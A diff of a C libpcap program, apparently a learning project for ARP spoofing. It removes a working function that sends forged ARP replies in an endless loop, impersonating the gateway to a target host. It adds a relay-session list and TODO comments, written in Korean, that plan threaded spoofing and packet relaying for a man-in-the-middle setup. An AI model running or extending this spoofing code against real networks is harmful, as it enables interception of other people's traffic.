@@ -9,10 +9,14 @@
 #include <arpa/inet.h>
 //custom headerfile
 #include "getLocalAddress.h"
+#include "ARPtools.h"
 
 void init_pcd(pcap_t **pcd, char **dev);
-void sendFakeARP(pcap_t *pcd, const struct in_addr targetIP, const struct ether_addr targetMAC,
-                              const struct in_addr fakeIP,   const struct ether_addr fakeMAC);
+void read_relayList(pcap_t *pcd); // TODO
+
+int relayNum;
+struct relaySession relayList[100];
+
 
 int main(int argc, char **argv)
 {
@@ -20,56 +24,22 @@ int main(int argc, char **argv)
     char *dev;
 
     struct in_addr      targetIP;
-    struct ether_addr   targetMAC; 
+    struct ether_addr   targetMAC;
 
     // init
     printf("pcd init ...");
     init_pcd(&pcd, &dev);
     printf("done\n");
 
-    // check input and specify target
-    printf("getting target's MAC address ...");
-    if(inet_aton(argv[1], &targetIP)==0)
-    {
-        printf("\nError: invalid IP : %s \n", argv[1]);
-        exit(1);
-    }
-    if(convertIP2MAC(pcd, targetIP, &targetMAC)==-1)
-    {
-        printf("\nError: given IP(%s) is not in the same network.\n", argv[1]);
-        exit(1);
-    }
-    printf("done.\n");
-
-    // send fake ARP
-    printf("start sending fake ARP\n");    
-    sendFakeARP(pcd, targetIP, targetMAC, getGatewayIP(), getMyAddr().MAC);
+    //TODO: read_relayList(pcd); 구현
+    //TODO
+    /*
+    * 주기적으로 fake ARP packet을 보내는 sendFakeARP와
+    * relayPackets를 각각 스레드로 나눠 동시에 진행
+    */
 
     return 0;
 }
-
-void sendFakeARP(pcap_t *pcd, const struct in_addr targetIP, const struct ether_addr targetMAC,
-                              const struct in_addr fakeIP,   const struct ether_addr fakeMAC)
-{
-    u_char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
-
-    makeARPpacket(packet, fakeIP, fakeMAC, targetIP, targetMAC, ARPOP_REPLY);
-
-    while(1)
-    {
-        // sending
-        if(pcap_inject(pcd, packet, sizeof(packet))==-1)
-        {
-            pcap_perror(pcd,0);
-            pcap_close(pcd);
-            exit(1);
-        }
-        sleep(1);
-    }
-
-    return;
-}
-
 
 void init_pcd(pcap_t **pcd, char **dev)
 {
